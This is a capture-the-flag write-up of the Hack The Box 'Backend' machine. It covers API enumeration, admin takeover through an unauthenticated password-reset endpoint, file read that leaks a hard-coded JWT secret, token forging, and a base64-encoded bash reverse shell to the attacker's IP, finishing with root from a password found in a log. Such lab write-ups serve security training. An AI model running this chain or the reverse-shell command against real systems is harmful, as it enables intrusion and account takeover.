---
title: "[HTB] Machine: Backend"
description: "[HTB] Machine: Backend"
date: 2023-11-09
menu:
  sidebar:
    name: "[HTB] Machine: Backend"
    identifier: htb-machine-Backend
    parent: htb-machines-linux
    weight: 10
hero: images/backend.png
tags: ["HTB", "api", "json", "uvicorn", "feroxbuster", "wfuzz", "swagger", "fastapi", "python", "jwt", "pyjwt", "jwt-io", "simple-modify-headers"]
---

# Backend
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.161 --min-rate 1000                                                                                                             
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 18:46 GMT
Nmap scan report for 10.10.11.161 (10.10.11.161)
Host is up (0.18s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
8527/tcp  filtered unknown
20524/tcp filtered unknown
30552/tcp filtered unknown
51149/tcp filtered unknown

```
```
└─$ nmap -Pn -p22,80 -sC -sV 10.10.11.161 --min-rate 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 18:51 GMT
Nmap scan report for 10.10.11.161 (10.10.11.161)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     date: Fri, 10 Nov 2023 23:02:09 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Fri, 10 Nov 2023 23:01:55 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     date: Fri, 10 Nov 2023 23:02:02 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94%I=7%D=11/10%Time=654E7BD1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,AD,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Fri,\x2010\x20Nov\x20202
SF:3\x2023:01:55\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2029\r\n
SF:content-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg
SF:\":\"UHC\x20API\x20Version\x201\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x20
SF:405\x20Method\x20Not\x20Allowed\r\ndate:\x20Fri,\x2010\x20Nov\x202023\x
SF:2023:02:02\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncon
SF:tent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail
SF:\":\"Method\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(
SF:FourOhFourRequest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Fri,
SF:\x2010\x20Nov\x202023\x2023:02:09\x20GMT\r\nserver:\x20uvicorn\r\nconte
SF:nt-length:\x2022\r\ncontent-type:\x20application/json\r\nConnection:\x2
SF:0close\r\n\r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20rec
SF:eived\.")%r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequest
SF:TCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20
SF:request\x20received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalS
SF:erverCookie,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20
SF:HTTP\x20request\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.90 seconds

```

- Port `80`

![](./images/1.png)

- `gobuster`
```
└─$ gobuster dir -u http://10.10.11.161/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --no-error      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.161/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 401) [Size: 30]
/api                  (Status: 200) [Size: 20]
```

## Foothold
- `api` endpoint returns `v1` endpoint

![](./images/2.png)

- `v1` has 2 endpoints

![](./images/3.png)

- We can't access `admin`

![](./images/4.png)

- `user` returns `Not Found`
  - We probably have to fuzz, since
  - If I visit `http://10.10.11.161/api/v1/user/1` I found a user

![](./images/5.png)

![](./images/6.png)

- I'll run `wfuzz` with `range` option and then with `wordlist`
  - I tried both `POST` and `GET` methods
  - Below are the results I got
```
└─$ wfuzz -u 'http://10.10.11.161/api/v1/user/FUZZ' -z range,0-1000 --hh 4
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 1001

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000002:   200        0 L      1 W        141 Ch      "1" 
```
```
└─$ wfuzz -u 'http://10.10.11.161/api/v1/user/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -XPOST --hh 31
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.161/api/v1/user/FUZZ
Total requests: 63087

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000009:   422        0 L      3 W        172 Ch      "login"
000000396:   422        0 L      2 W        81 Ch       "signup" 
```

- Let's also `fuzz` `admin` endpoint
```
└─$ feroxbuster -u http://10.10.11.161/api/v1/admin -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 -mPOST,GET,PUT

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.161/api/v1/admin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [POST, GET, PUT]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
307     POST        0l        0w        0c http://10.10.11.161/api/v1/admin => http://10.10.11.161/api/v1/admin/
307      GET        0l        0w        0c http://10.10.11.161/api/v1/admin => http://10.10.11.161/api/v1/admin/
307      PUT        0l        0w        0c http://10.10.11.161/api/v1/admin => http://10.10.11.161/api/v1/admin/
405     POST        1l        3w       31c http://10.10.11.161/api/v1/admin/
401      GET        1l        2w       30c http://10.10.11.161/api/v1/admin/
405      PUT        1l        3w       31c http://10.10.11.161/api/v1/admin/
401     POST        1l        2w       30c http://10.10.11.161/api/v1/admin/file
405      GET        1l        3w       31c http://10.10.11.161/api/v1/admin/file
405      PUT        1l        3w       31c http://10.10.11.161/api/v1/admin/file

```

- We have `signup` and `login` endpoints
  - We have to register a user and login
  - We have to input `email` and `password`
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/login | jq .
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
} 
```

- Let's register a user
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/signup | jq .
{
  "detail": [
    {
      "loc": [
        "body"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
```
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"key":"value"}'| jq .
{
  "detail": [
    {
      "loc": [
        "body",
        "email"
      ],
      "msg": "field required",                                                                                                                                                                                                              
      "type": "value_error.missing"                                                                                                                                                                                                         
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",                                                                                                                                                                                                              
      "type": "value_error.missing"                                                                                                                                                                                                         
    }
  ]
} 
```
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/signup -H 'Content-Type: application/json' -d '{"email":"pentest@mail.htb", "password":"P@ssword1"}'| jq .
{}

```

- We receive `{}`
  - Let's try to login
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/login -H 'Content-Type: application/json' -d '{"username":"pentest@mail.htb", "password":"P@ssword1"}'| jq .
{
  "detail": [
    {
      "loc": [
        "body",
        "username"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    },
    {
      "loc": [
        "body",
        "password"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}   
```

- It doesn't work
  - Let's try sending simple `http` body
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/login -d 'username=pentest@mail.htb&password=P@ssword1' | jq .                 
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDkzODIwLCJpYXQiOjE2OTk4MDI2MjAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNWRlNmQyODMtMzM0ZS00OTAyLWE0ZDEtNmRmMjQ5OWI5NmM0In0.oczL0rs8ovC9ZhiQpBcBK7noel-x3Yofp0uZfs0Mopk",
  "token_type": "bearer"                                                                                                                                                                                                                    
}
```

- Let's use https://jwt.io/
  - We see the flag `is_superuser` is set to `false`

![](./images/7.png)

- Let's navigate to `docs`
  - Use `Simply Modify Header` extension on `Firefox`

![](./images/8.png)

![](./images/9.png)

- `/api/v1/admin/exec/{command}` requires `Debug Permissions`
```
{
  "detail": "Debug key missing from JWT"
}
```
- We have `/api/v1/user/updatepass` endpoint 
  - And it doesn't require authorization
  - Let's try changing `admin`'s password
    - Visit http://10.10.11.161/api/v1/user/1 to get `admin`'s `guid`

![](./images/10.png)

- Looks like it worked
  - Let's get the token
```
└─$ curl -s -XPOST http://10.10.11.161/api/v1/user/login -d 'username=admin@htb.local&password=P@ssw0rd' | jq .
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY",                                                                                                                                                                                                
  "token_type": "bearer"                                                                                                                                                                                                                    
}
```

- Now we can use `admin`'s endpoints

![](./images/11.png)

- Let's try executing command
  - But we have to modify `jwt`, thus we need a secret to do that
  - Let's use `file` endpoint and check the source code
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}' | jq -r '.file' 
APP_MODULE=app.main:appPWD=/home/htb/uhcLOGNAME=htbPORT=80HOME=/home/htbLANG=C.UTF-8VIRTUAL_ENV=/home/htb/uhc/.venvINVOCATION_ID=adb0663a4d7542eba0d4209d6f9cefbdHOST=0.0.0.0USER=htbSHLVL=0PS1=(.venv) JOURNAL_STREAM=9:17330PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binOLDPWD=/
```
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/proc/self/cmdline"}' | jq -r '.file'
/home/htb/uhc/.venv/bin/python3-cfrom multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)--multiprocessing-fork
```
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/main.py"}' | jq -r '.file'
import asyncio

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app import deps
from app import crud


app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)
<SNIP>
def start():
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")

if __name__ == "__main__":
    # Use this for debugging purposes only
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="debug")


```

- We see `from app.api.v1.api import api_router`, which could mean that `app/api/v1/api.py` or `app/api/v1/api/api_router.py`
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/api/v1/api.py"}' | jq -r '.file'
from fastapi import APIRouter

from app.api.v1.endpoints import user, admin


api_router = APIRouter()
api_router.include_router(user.router, prefix="/user", tags=["user"])
api_router.include_router(admin.router, prefix="/admin", tags=["admin"])

```

- `from app.api.v1.endpoints import user, admin`
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/api/v1/endpoints/admin.py"}' | jq -r '.file'
import asyncio

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from sqlalchemy.orm import Session
from typing import Any, Optional

from app import crud
from app.api import deps

from app import schemas

from app.schemas.admin import GetFile
from app.schemas.user import User


router = APIRouter()

<SNIP>

@router.get("/exec/{command}", status_code=200)
def run_command(
    command: str,
    current_user: User = Depends(deps.parse_token),
    db: Session = Depends(deps.get_db)
) -> str:
    """
    Executes a command. Requires Debug Permissions.
    """
    if "debug" not in current_user.keys():
        raise HTTPException(status_code=400, detail="Debug key missing from JWT")

    import subprocess

    return subprocess.run(["/bin/sh","-c",command], stdout=subprocess.PIPE).stdout.strip()
```

- Okay, we see the check `if "debug" not in current_user.keys()`
  - Let's find a `secret`
    - `from app.api import deps` so `app/api/deps.py`
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/api/deps.py"}' | jq -r '.file'
from typing import Generator, Optional

from fastapi import Depends, HTTPException, status
from jose import jwt, JWTError
from pydantic import BaseModel
from sqlalchemy.orm.session import Session

from app.core.auth import oauth2_scheme
from app.core.config import settings
from app.db.session import SessionLocal
from app.models.user import User

<SNIP>

async def get_current_user(
    db: Session = Depends(get_db), token: str = Depends(oauth2_scheme)
) -> User:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(
            token,
            settings.JWT_SECRET,
            algorithms=[settings.ALGORITHM],
            options={"verify_aud": False},
        )
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception
        token_data = TokenData(username=username)
    except JWTError:
        raise credentials_exception

    user = db.query(User).filter(User.id == token_data.username).first()
    if user is None:
        raise credentials_exception
    return user

<SNIP>

```

- `app.core.config import settings`, since `settings.JWT_SECRET`
  - We have to check `app/core/config.py` or `app/core/config/settings.py`
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/file' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.iacd8W7W-fJk3RfFl5R1W82FwYS98cjzyZ8zsdmx0vY' -H 'Content-Type: application/json' -d '{"file": "/home/htb/uhc/app/core/config.py"}' | jq -r '.file' 
from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator
from typing import List, Optional, Union

from enum import Enum


class Settings(BaseSettings):
    API_V1_STR: str = "/api/v1"
    JWT_SECRET: str = "SuperSecretSigningKey-HTB"
    ALGORITHM: str = "HS256"

    # 60 minutes * 24 hours * 8 days = 8 days
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8

    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins
    # e.g: '["http://localhost", "http://localhost:4200", "http://localhost:3000", \
    # "http://localhost:8080", "http://local.dockertoolbox.tiangolo.com"]'
    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []

    @validator("BACKEND_CORS_ORIGINS", pre=True)
    def assemble_cors_origins(cls, v: Union[str, List[str]]) -> Union[List[str], str]:
        if isinstance(v, str) and not v.startswith("["):
            return [i.strip() for i in v.split(",")]
        elif isinstance(v, (list, str)):
            return v
        raise ValueError(v)

    SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
    FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"    

    class Config:
        case_sensitive = True
 

settings = Settings()

```

- The key is `SuperSecretSigningKey-HTB`
  - Let's generate our token with `debug` key

![](./images/12.png)

- And it works
  - I'll use `base64` encoded payload and replace spaces with `%20`
```
└─$ curl -s http://10.10.11.161/api/v1/admin/exec/id -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.xMuQcHbWkrL26gqgMxmvTqTxV7bvaFRnVRidtpb3rAw' | jq -r .
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

- Let's get a shell
```
└─$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.16.4/6666 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC82NjY2IDA+JjEiCg==
```
```
└─$ curl -s 'http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC82NjY2IDA+JjEiCg==|base64%20-d|bash' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzAwNDk4NTM0LCJpYXQiOjE2OTk4MDczMzQsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.xMuQcHbWkrL26gqgMxmvTqTxV7bvaFRnVRidtpb3rAw' | jq -r .
```

![](./images/13.png)

## Root
- `auth.log`
```
htb@backend:~/uhc$ cat auth.log 
11/12/2023, 09:30:42 - Login Success for admin@htb.local
11/12/2023, 09:34:02 - Login Success for admin@htb.local
11/12/2023, 09:47:22 - Login Success for admin@htb.local
11/12/2023, 09:50:42 - Login Success for admin@htb.local
11/12/2023, 09:55:42 - Login Success for admin@htb.local
11/12/2023, 09:59:02 - Login Success for admin@htb.local
11/12/2023, 10:12:22 - Login Success for admin@htb.local
11/12/2023, 10:20:42 - Login Success for admin@htb.local
11/12/2023, 10:22:22 - Login Success for admin@htb.local
11/12/2023, 10:29:02 - Login Success for admin@htb.local
11/12/2023, 10:37:22 - Login Failure for Tr0ub4dor&3
11/12/2023, 10:38:57 - Login Success for admin@htb.local
11/12/2023, 10:39:02 - Login Success for admin@htb.local
11/12/2023, 10:39:22 - Login Success for admin@htb.local
11/12/2023, 10:40:42 - Login Success for admin@htb.local
11/12/2023, 10:45:42 - Login Success for admin@htb.local
11/12/2023, 10:52:22 - Login Success for admin@htb.local
11/12/2023, 15:23:39 - Login Success for pentest@mail.htb
11/12/2023, 16:42:14 - Login Success for admin@htb.local
```

- If we try to use as password for `root`, it works
```
htb@backend:~/uhc$ su -
Password: 
root@backend:~# 

```